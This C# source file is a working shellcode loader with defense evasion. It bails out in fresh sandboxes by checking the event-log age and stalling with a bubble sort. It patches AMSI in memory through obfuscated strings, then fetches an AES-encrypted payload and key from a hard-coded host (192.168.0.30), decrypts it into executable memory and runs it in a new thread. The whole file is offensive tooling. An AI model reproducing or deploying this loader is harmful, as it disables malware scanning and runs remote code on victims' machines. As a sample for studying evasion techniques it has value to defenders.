using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Linq;
using System.Net.Http;

namespace BitterCandy
{
    class sjokolade
    {


        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);


        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return transform(data, decryptor);
                }
            }
        }

        private byte[] transform(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {


            if (IsFirstEventLogLessThanDayOld())
            {
                Console.WriteLine("The IsFirstEventLogLessThanDayOld match!");

                Environment.Exit(1);
            }

            Random rand = new Random();
            int[] array = new int[110000];
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = rand.Next(1, 1000000); // or choose another range for the random numbers
            }
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            BubbleSort(array);

            stopwatch.Stop();
            Console.WriteLine("Time elapsed: {0} seconds", stopwatch.Elapsed.TotalSeconds);

            if (IsSorted(array))
            {
                Console.WriteLine("The array is sorted and time was spent ");
            }
            else
            {
                Console.WriteLine("The array is NOT sorted.");
                Environment.FailFast("Crash!");
            }

            //patching AMSI using obfuscation
            Console.WriteLine("patching AMSI using obfuscation");
            var randomNumbers = new int[] { 97, 109, 115, 105, 46, 100, 108, 108 };
            var shiftedNumbers = randomNumbers.Select(x => x + 1).ToArray();
            var charArray = shiftedNumbers.Select(x => (char)x).ToArray();
            var asciiString = new string(charArray);
            var shiftedBackString = new string(asciiString.Select(c => (char)(c - 1)).ToArray());
            var finalHexString = BitConverter.ToString(System.Text.Encoding.ASCII.GetBytes(shiftedBackString)).Replace("-", "").ToLower();

            IntPtr Library = LoadLibrary(HexToString(finalHexString));

            string baseString = "416d73695363616e42756666657";
            string targetMd5 = "1d2382213b2cf4aa47ee459175c5358c";
            string target = "";
            for (int i = 1; i < 10; i++)
            {
                string testString = baseString + i;
                string testMd5 = CalculateMD5(testString);


                if (testMd5 == targetMd5)
                {
                    target = testString;
                    break;
                }
            }


            IntPtr Address = GetProcAddress(Library, HexToString(target));
            uint potet;

            VirtualProtect(Address, (UIntPtr)5, 0x40, out potet);
            string encoded = "B857000780C3";
            byte[] Patch = new byte[encoded.Length / 2];
            for (int i = 0; i < encoded.Length; i += 2)
            {
                Patch[i / 2] = Convert.ToByte(encoded.Substring(i, 2), 16);
            }

            copy(Patch, Address);
            Console.WriteLine("AMSI patched!");



            byte[] Nokkelen = new byte[32];
            byte[] Ivektor = new byte[16];
            byte[] kodesnutt = null;
            byte[] keyAndIv = null;
            try
            {
                kodesnutt = RetrieveBinaryFile("http://192.168.0.30/end.bin");
                keyAndIv = RetrieveBinaryFile("http://192.168.0.30/key_iv.bin");
                Array.Copy(keyAndIv, 0, Nokkelen, 0, 32);
                Array.Copy(keyAndIv, 32, Ivektor, 0, 16);

            }
            catch (HttpRequestException e)
            {
                Console.WriteLine("\nException Caught!");
                Console.WriteLine("Message :{0} ", e.Message);
                Environment.Exit(1);
            }


            var banana = new sjokolade();
            byte[] biler = banana.Decrypt(kodesnutt, Nokkelen, Ivektor);
            int size = biler.Length;

            IntPtr va = VirtualAlloc(IntPtr.Zero, (uint)biler.Length, 0x3000, 0x40);
            Marshal.Copy(biler, 0, va, size);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, 0xFFFFFFFF);


        }

        public static string CalculateMD5(string input)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("x2"));
                }
                return sb.ToString();
            }
        }


        static bool IsFirstEventLogLessThanDayOld()
        {
            System.Diagnostics.EventLog log = new System.Diagnostics.EventLog("System");

            if (log.Entries.Count > 0)
            {
                var firstEvent = log.Entries[0];
                var age = DateTime.Now - firstEvent.TimeGenerated;

                return age.TotalDays < 1;
            }

            return false;
        }


        static void BubbleSort(int[] array)
        {
            int n = array.Length;
            for (int i = 0; i < n - 1; i++)
            {
                for (int j = 0; j < n - i - 1; j++)
                {
                    if (array[j] > array[j + 1])
                    {
                        // swap temp and array[j]
                        int temp = array[j];
                        array[j] = array[j + 1];
                        array[j + 1] = temp;
                    }
                }
            }
        }


        static bool IsSorted(int[] array)
        {
            for (int i = 0; i < array.Length - 1; i++)
            {
                if (array[i] > array[i + 1])
                {
                    return false;
                }
            }
            return true;
        }

        private static void copy(Byte[] Patch, IntPtr Address)
        {
            Marshal.Copy(Patch, 0, Address, 6);
        }

        public static string HexToString(string hex)
        {
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < hex.Length; i += 2)
            {
                string hs = hex.Substring(i, 2);
                result.Append(Convert.ToChar(Convert.ToUInt32(hs, 16)));
            }

            return result.ToString();
        }

        static byte[] RetrieveBinaryFile(string url)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = client.GetAsync(url).Result;
            byte[] responseBody = response.Content.ReadAsByteArrayAsync().Result;
            return responseBody;
        }

        


    }

}
